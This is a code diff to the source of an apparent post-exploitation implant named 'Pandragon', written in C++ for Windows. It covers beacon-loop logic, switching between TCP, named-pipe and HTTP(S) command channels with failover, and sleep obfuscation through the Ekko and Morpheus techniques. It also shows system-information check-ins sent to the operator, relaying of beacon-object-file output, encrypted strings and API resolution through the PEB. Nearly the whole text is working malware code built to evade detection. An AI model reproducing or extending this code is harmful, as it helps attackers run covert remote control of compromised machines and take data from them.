@@ -98,7 +98,7 @@ static bool initNetworkFromConfig(PandragonRuntime& runtime) {
     bool transport_set = false;
 
 #ifdef PANDRAGON_ENABLE_TCP
-    if (!transport_set && ch->type == PCFG_CHANNEL_TCP) {
+    if (!transport_set && ch->type == PCFG_ChannelType::TCP) {
         ::setTransport(tcpSocketRequest);
         ::setTransportType(lcg_encrypt("tcp"));
         g_debugPrint("[initNetworkFromConfig] Using TCP transport");
@@ -106,7 +106,7 @@ static bool initNetworkFromConfig(PandragonRuntime& runtime) {
     }
 #endif
 #ifdef PANDRAGON_ENABLE_PIPE
-    if (!transport_set && ch->type == PCFG_CHANNEL_PIPE) {
+    if (!transport_set && ch->type == PCFG_ChannelType::PIPE) {
         ::setTransport(pipeSocketRequest);
         ::setTransportType(lcg_encrypt("pipe"));
         g_debugPrint("[initNetworkFromConfig] Using Named Pipe transport");
@@ -114,7 +114,7 @@ static bool initNetworkFromConfig(PandragonRuntime& runtime) {
     }
 #endif
 #ifdef PANDRAGON_ENABLE_HTTP
-    if (!transport_set && ch->type == PCFG_CHANNEL_HTTP) {
+    if (!transport_set && ch->type == PCFG_ChannelType::HTTP) {
         ::setTransport(winhttpRequest);
         ::setTransportType(lcg_encrypt("http"));
         g_debugPrint("[initNetworkFromConfig] Using WinHTTP transport (HTTP)");
@@ -122,7 +122,7 @@ static bool initNetworkFromConfig(PandragonRuntime& runtime) {
     }
 #endif
 #ifdef PANDRAGON_ENABLE_HTTPS
-    if (!transport_set && ch->type == PCFG_CHANNEL_HTTPS) {
+    if (!transport_set && ch->type == PCFG_ChannelType::HTTPS) {
         ::setTransport(winhttpRequest);
         ::setTransportType(lcg_encrypt("http"));
         g_debugPrint("[initNetworkFromConfig] Using WinHTTP transport (HTTPS)");
@@ -276,8 +276,8 @@ static bool configureRuntimeFeatures(PandragonRuntime& runtime) {
     case 1: runtime.setSleepObfMethod(SleepObfMethod::EKKO);
             g_debugPrint("[__start] Sleep obfuscation: Ekko enabled");
             break;
-    case 2: runtime.setSleepObfMethod(SleepObfMethod::FOLIAGE);
-            g_debugPrint("[__start] Sleep obfuscation: Foliage (stub)");
+    case 2: runtime.setSleepObfMethod(SleepObfMethod::MORPHEUS);
+            g_debugPrint("[__start] Sleep obfuscation: Morpheus (WaitOnAddress)");
             break;
     default: runtime.setSleepObfMethod(SleepObfMethod::NONE);
             g_debugPrint("[__start] Sleep obfuscation: disabled");
@@ -341,11 +341,12 @@ static LoopState setupLoopState(PandragonRuntime& runtime) {
                  (unsigned long)ls.checkin_target);
 
     g_debugPrint("Entering main beacon loop");
-    g_debugPrint("Using channel %u: %s:%d%s, max_fails=%d, backoff_ms=%lu", 
+    g_debugPrint("Using channel %u: %s:%d poll=%s submit=%s, max_fails=%d, backoff_ms=%lu", 
                  (unsigned)ls.active_channel, 
                  config->channels[0].host, 
                  config->channels[0].port, 
-                 config->channels[0].path,
+                 config->channels[0].poll_path,
+                 config->channels[0].submit_path,
                  ls.max_fails, (unsigned long)ls.backoff_ms);
 
     return ls;
@@ -372,13 +373,13 @@ static void handleChannelFailover(PandragonRuntime& runtime, LoopState& ls) {
 
         // Switch transport based on channel type
 #ifdef PANDRAGON_ENABLE_TCP
-        if (new_ch->type == PCFG_CHANNEL_TCP) {
+        if (new_ch->type == PCFG_ChannelType::TCP) {
             ::setTransport(tcpSocketRequest);
             ::setTransportType(lcg_encrypt("tcp"));
             g_debugPrint("[failover] Channel %u using TCP transport", (unsigned)ls.active_channel);
         } else 
 #elif defined(PANDRAGON_ENABLE_PIPE)
-        if (new_ch->type == PCFG_CHANNEL_PIPE) {
+        if (new_ch->type == PCFG_ChannelType::PIPE) {
             ::setTransport(pipeSocketRequest);
             ::setTransportType(lcg_encrypt("pipe"));
             g_debugPrint("[failover] Channel %u using Named Pipe transport", (unsigned)ls.active_channel);
@@ -419,11 +420,11 @@ static void handleLazyCheckin(PandragonRuntime& runtime, LoopState& ls) {
         char* sysinfo = gatherSystemInfo(&sysinfo_len);
         if (sysinfo && sysinfo_len > 0) {
             g_debugPrint("[checkin] System info: %zu bytes", sysinfo_len);
-            runtime.getNetworkManager().sendCheckin(sysinfo, sysinfo_len);
+            (void)runtime.getNetworkManager().sendCheckin(sysinfo, sysinfo_len);
             __free(sysinfo);
         } else {
             g_debugPrint("[checkin] System info gathering failed, sending bare check-in");
-            runtime.getNetworkManager().sendCheckin();
+            (void)runtime.getNetworkManager().sendCheckin();
         }
         ls.checkin_sent = true;
     }
@@ -585,7 +586,7 @@ static void mainBeaconLoop(PandragonRuntime& runtime) {
             auto& abm = AsyncBofManager::instance();
             async_bof_state* cur = abm.getHead();
             while (cur) {
-                if (cur->bof_class != BOF_CLASS_LONG_RUNNING) {
+                if (cur->bof_class != BOF_CLASS::LONG_RUNNING) {
                     cur = cur->next;
                     continue;
                 }
@@ -604,7 +605,7 @@ static void mainBeaconLoop(PandragonRuntime& runtime) {
                             if (output) {
                                 DWORD data_read = 0;
                                 if (nt->ReadFile(cur->handle, output, record_length, &data_read, NULL)) {
-                                    pandragon::sendBofOutput((char*)output, data_read, cur->task_id);
+                                    (void)pandragon::sendBofOutput((char*)output, data_read, cur->task_id);
                                 }
                                 __free(output);
                             }
@@ -632,7 +633,7 @@ static void mainBeaconLoop(PandragonRuntime& runtime) {
                             char* output = (char*)__malloc(ch->record_length);
                             if (output) {
                                 __memcpy(output, ch->data, ch->record_length);
-                                pandragon::sendBofOutput(output, ch->record_length, cur->task_id);
+                                (void)pandragon::sendBofOutput(output, ch->record_length, cur->task_id);
                                 __free(output);
                             }
                         }
@@ -679,7 +680,7 @@ static uint32_t checkAsyncBofForceSleep(void) {
     auto& abm = AsyncBofManager::instance();
     async_bof_state* cur = abm.getHead();
     while (cur) {
-        if (cur->bof_class == BOF_CLASS_LONG_RUNNING && cur->requested_sleep_sec > 0) {
+        if (cur->bof_class == BOF_CLASS::LONG_RUNNING && cur->requested_sleep_sec > 0) {
             uint32_t sleep_ms = cur->requested_sleep_sec * 1000;
             g_debugPrint("[MAIN] Async BOF task %u requested FORCE_SLEEP: %u sec", cur->task_id, cur->requested_sleep_sec);
             cur->requested_sleep_sec = 0;  /* Consume the request */
@@ -697,7 +698,7 @@ static bool checkAsyncBofWakeupSignals(AsyncBofManager& abm) {
     async_bof_state* exit_state = nullptr;
 
     while (cur) {
-        if (cur->bof_class == BOF_CLASS_LONG_RUNNING && cur->channel) {
+        if (cur->bof_class == BOF_CLASS::LONG_RUNNING && cur->channel) {
             bof_channel* ch = cur->channel;
             if (ch->signal == CHANNEL_SIGNAL_WAKEUP_SEND) {
                 has_wakeup_send = true;
@@ -718,13 +719,13 @@ static bool checkAsyncBofWakeupSignals(AsyncBofManager& abm) {
         /* Flush output for all async BOFs */
         async_bof_state* cur2 = abm.getHead();
         while (cur2) {
-            if (cur2->bof_class == BOF_CLASS_LONG_RUNNING && cur2->channel) {
+            if (cur2->bof_class == BOF_CLASS::LONG_RUNNING && cur2->channel) {
                 bof_channel* ch = cur2->channel;
                 if (ch->data_valid && !ch->data_acked && ch->record_length > 0) {
                     char* output = (char*)__malloc(ch->record_length);
                     if (output) {
                         __memcpy(output, ch->data, ch->record_length);
-                        pandragon::sendBofOutput(output, ch->record_length, cur2->task_id);
+                        (void)pandragon::sendBofOutput(output, ch->record_length, cur2->task_id);
                         __free(output);
                     }
                     ch->data_acked = 1;
@@ -758,6 +759,22 @@ static bool checkAsyncBofWakeupSignals(AsyncBofManager& abm) {
 }
 
 int __start(void) {
+#ifdef DEBUG
+    // --subsystem,windows provides no console; allocate one so printf/debugPrint works.
+    HMODULE kernel32 = GetModuleBaseAddressA("kernel32.dll");
+    if (kernel32) {
+        typedef BOOL (WINAPI *fnAllocConsole)(void);
+        typedef HANDLE (WINAPI *fnGetStdHandle)(DWORD);
+        fnAllocConsole pAllocConsole = (fnAllocConsole)__GetProcAddress(kernel32, "AllocConsole");
+        fnGetStdHandle pGetStdHandle  = (fnGetStdHandle)__GetProcAddress(kernel32, "GetStdHandle");
+        if (pAllocConsole && pAllocConsole()) {
+            HANDLE hConOut = pGetStdHandle ? pGetStdHandle(STD_OUTPUT_HANDLE) : INVALID_HANDLE_VALUE;
+            if (hConOut != INVALID_HANDLE_VALUE)
+                getCurrentPEB()->ProcessParameters->StdOutputHandle = hConOut;
+        }
+    }
+#endif
+
     PandragonRuntime* runtime = nullptr;
 
     functionTable* nt = initializeRuntime(runtime);
